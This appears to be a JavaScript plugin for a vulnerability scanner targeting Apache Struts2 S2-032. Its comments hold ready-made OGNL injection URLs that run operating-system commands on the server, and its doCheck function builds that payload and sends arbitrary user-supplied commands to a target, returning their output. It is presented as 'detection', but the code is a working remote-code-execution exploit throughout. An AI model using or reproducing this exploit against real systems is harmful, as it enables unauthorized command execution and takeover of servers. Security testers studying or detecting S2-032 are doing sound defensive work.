module.exports={
	tags:"struts2,032",
	des:"struts2 032Vulnerability detection",
	"ID":"020105",
	VulApps:[
		"https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-032",
		"https://github.com/Medicean/VulApps/blob/master/s/struts2/s2-032/s2-032.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-032"],
/*
http://127.0.0.1/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10086

http://127.0.0.1/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id

/memoindex.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&pp=\\A&ppp= &encoding=UTF-8&cmd=id

// payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close': '', 'tag': tag}
在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，
DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），
这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会
*/
	doCheck:function (url,fnCbk)
	{
		var _t = this,szOldUrl = url,s,_s = _t.self;
		// 测试证明，有些@要编码，有些不能编码
		s = "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString";
		var fnTT = function(x1)
		{
			return _s.fnUrlEncode(x1,'#:@=.[]?( )');
		};
		s = fnTT(s);
		var fnT=function(cmd,fnCbk9)
		{
			_s.request(_s.fnOptHeader({method: 'GET',uri: url + "?method:" 
				+ s
			+ "&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=" + fnTT(cmd)// + encodeURIComponent(g_szCmd.replace(/;/gmi,"&&"))
				}),
		    	function(e,r,b)
		    {
		    	_s.error(e);
		    	var szTmp = String(e || b);
		    	_s.fnShowBody(szTmp);
		    	try{if("function" == typeof fnCbk9)fnCbk9(szTmp);}catch(e){}
		    });
		},a = _s.g_szCmd.split(";"),aR = [];
		_s.async.mapLimit(a,_s.g_nThread,function(szCmd,fnCbk1)
		{
			fnT(szCmd,function(s1)
			{
				var n = a.indexOf(szCmd);
				// console.log([n, szCmd]);
				aR[n] = s1;
				if(aR.length == a.length)
				{
					_s.fnDoBody(aR.join(""),"s2-032",szOldUrl,null,function(o)
			    	{
			    		var r = {"url":szOldUrl,"send":s};
		  				fnCbk(_s.copyO2O(r,o),_t);
			    	});
				}
				fnCbk1();
			});
		});
	}
};